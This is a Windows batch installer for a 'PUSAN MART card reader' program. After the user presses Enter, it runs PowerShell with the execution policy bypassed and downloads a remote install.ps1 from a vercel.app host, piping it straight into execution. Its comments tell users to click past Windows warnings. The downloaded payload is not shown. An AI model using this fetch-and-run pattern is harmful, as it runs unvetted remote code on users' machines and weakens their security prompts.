@echo off
rem PUSAN MART card reader: Windows installer started from the web page's [Download installer] button.
rem Open the downloaded file: this window opens with everything ready, and the user only presses Enter.
rem If Windows warns, choose "More info" then "Run anyway". It still needs PowerShell to be allowed on this PC;
rem if PowerShell is blocked by policy or antivirus, only this PC's administrator can allow it.
title PUSAN MART card reader - install
echo.
echo   ============================================
echo     PUSAN MART card reader program
echo   ============================================
echo.
echo   Press Enter to install.
echo   To cancel, close this window.
echo.
pause >nul
echo   Installing...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol='Tls12';sv b 'https://smeag-estore.vercel.app/bridge';irm 'https://smeag-estore.vercel.app/bridge/install.ps1'|iex"
if errorlevel 1 (
  echo.
  echo   Could not install. PowerShell may be blocked on this PC.
  echo   Ask this PC's administrator to allow PowerShell, or sign in with an administrator account.
  echo.
  pause
)
